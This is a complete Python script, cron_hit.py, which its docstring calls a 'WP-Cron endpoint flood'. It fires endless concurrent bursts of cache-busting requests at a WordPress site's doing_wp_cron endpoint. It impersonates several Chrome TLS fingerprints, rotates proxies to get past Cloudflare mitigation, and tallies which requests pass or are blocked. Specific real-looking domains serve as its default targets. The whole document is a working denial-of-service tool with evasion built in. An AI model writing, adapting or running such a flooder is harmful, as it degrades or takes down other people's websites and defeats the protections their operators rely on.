#!/usr/bin/env python3
"""
cron_hit.py — WP-Cron endpoint flood via curl_cffi (no proxy needed)

Usage:
  python3 cron_hit.py
  python3 cron_hit.py --target metoo-shatkin.com
  python3 cron_hit.py --concurrency 40 --bursts 0
  python3 cron_hit.py --proxy http://user:pass@host:port
"""

import time, random, argparse, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as cffi

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

PROFILES = [
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("chrome107", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"),
]

_lock = threading.Lock()
_stats = {"ok": 0, "blocked": 0, "err": 0, "total": 0}
_proxy_list = []
_proxy_idx  = 0


def load_proxies(path):
    global _proxy_list
    with open(path) as f:
        _proxy_list = [l.strip() for l in f if l.strip()]
    print(f"Loaded {len(_proxy_list)} proxies from {path}")


def next_proxy():
    global _proxy_idx
    with _lock:
        p = _proxy_list[_proxy_idx % len(_proxy_list)]
        _proxy_idx += 1
    return p


def make_url(target):
    ts = f"{time.time():.6f}.{random.random():.10f}"
    return f"https://{target}/?doing_wp_cron={ts}"


def send_one(target, proxy, req_num):
    imp, ua = random.choice(PROFILES)
    url = make_url(target)
    if _proxy_list:
        p = next_proxy()
    else:
        p = proxy
    proxies = {"http": p, "https": p} if p else None
    t0 = time.time()
    try:
        r = cffi.get(
            url,
            headers={"User-Agent": ua},
            proxies=proxies,
            impersonate=imp,
            timeout=15,
        )
        elapsed = time.time() - t0
        status = r.status_code
        mitigated = r.headers.get("cf-mitigated", "")
        cache = r.headers.get("cf-cache-status", "?")

        if status == 200 and not mitigated:
            color = G; tag = "PASS"
            with _lock: _stats["ok"] += 1
        elif mitigated or status in (403, 429):
            color = R; tag = "BLOCK"
            with _lock: _stats["blocked"] += 1
        else:
            color = Y; tag = str(status)
            with _lock: _stats["err"] += 1

        with _lock: _stats["total"] += 1
        print(f"  [{req_num:>3}] {color}{tag}{W}  {status}  cache={cache}  {elapsed:.2f}s  {imp}")
        return tag
    except Exception as e:
        elapsed = time.time() - t0
        with _lock:
            _stats["err"] += 1
            _stats["total"] += 1
        print(f"  [{req_num:>3}] {R}ERR{W}  {str(e)[:50]}  {elapsed:.2f}s")
        return "ERR"


def burst(target, concurrency, proxy, burst_num, start_req):
    print(f"\n{B}{C}── Burst {burst_num} ─────────────────────────────────{W}")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futs = {pool.submit(send_one, target, proxy, start_req + i): i
                for i in range(concurrency)}
        for f in as_completed(futs):
            _ = f.result()
    elapsed = time.time() - t0
    ok = _stats["ok"]; bl = _stats["blocked"]; tot = _stats["total"]
    print(f"  {B}burst done{W}  {elapsed:.1f}s  "
          f"total: {G}{ok} pass{W} / {R}{bl} blocked{W} / {tot} sent")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target",      default="metoo-buffalo.com")
    ap.add_argument("--concurrency", type=int, default=30)
    ap.add_argument("--bursts",      type=int, default=0,
                    help="0 = run forever (Ctrl+C to stop)")
    ap.add_argument("--delay",       type=float, default=1.0,
                    help="seconds between bursts")
    ap.add_argument("--proxy",       default=None,
                    help="single proxy e.g. http://user:pass@host:port")
    ap.add_argument("--proxy-file",  default=None,
                    help="file with one proxy per line (round-robin)")
    args = ap.parse_args()

    if args.proxy_file:
        load_proxies(args.proxy_file)

    proxy_label = args.proxy_file or args.proxy or "none (system IP)"
    print(f"{B}cron_hit.py{W}  target={C}{args.target}{W}  "
          f"concurrency={args.concurrency}  "
          f"proxy={proxy_label}")
    print("Ctrl+C to stop\n")

    req_counter = 1
    burst_num   = 1
    try:
        while True:
            burst(args.target, args.concurrency, args.proxy, burst_num, req_counter)
            req_counter += args.concurrency
            burst_num   += 1
            if args.bursts and burst_num > args.bursts:
                break
            time.sleep(args.delay)
    except KeyboardInterrupt:
        pass

    print(f"\n{B}done{W}  {_stats['total']} reqs — "
          f"{G}{_stats['ok']} pass{W}  {R}{_stats['blocked']} blocked{W}  "
          f"{Y}{_stats['err']} err{W}")


if __name__ == "__main__":
    main()
